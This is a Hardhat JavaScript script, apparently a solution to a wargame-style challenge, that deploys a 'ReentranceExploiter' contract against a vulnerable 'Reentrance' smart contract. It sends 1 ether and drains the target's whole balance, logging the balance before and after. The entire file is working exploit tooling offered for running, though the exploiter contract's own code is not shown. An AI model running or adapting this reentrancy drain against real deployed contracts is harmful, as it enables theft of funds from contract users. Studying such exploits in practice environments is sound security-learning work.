// reentrance.js - Exploits the Reentrance contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { reentranceAddress, reentranceAbi } = require("../contracts");

async function main() {
    // Get ethers signer and contract instances
    const provider = ethers.provider;
    const account = await ethers.getSigner();
    const reentrance = new ethers.Contract(reentranceAddress, reentranceAbi, provider);
    const reentranceSigner = reentrance.connect(account);

    // Deploy the Exploiter contract
    const Exploiter = await ethers.getContractFactory("ReentranceExploiter");
    const exploiter = await Exploiter.deploy(reentranceAddress);

    await exploiter.deployed();

    console.log("Exploiter deployed to:", exploiter.address);

    // Run exploit
    console.log("Running exploit...")

    // Get the starting balance of the reentrance contract
    let balance = await provider.getBalance(reentranceAddress);
    console.log("Balance of Reentrance contract is currently:", balance);

    // Run the attack
    console.log("Sending 1 ether and withdrawing all of the contracts balance...");
    let sendTxn = await exploiter.exploit({value: ethers.utils.parseUnits("1", "ether"), gasLimit: ethers.utils.parseUnits('500000', 'wei') });
    await sendTxn.wait();

    // Confirm exploit 
    balance = await provider.getBalance(reentranceAddress);
    console.log("Balance of Reentrance contract is now:", balance);

    console.log("Exploit completed.")

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });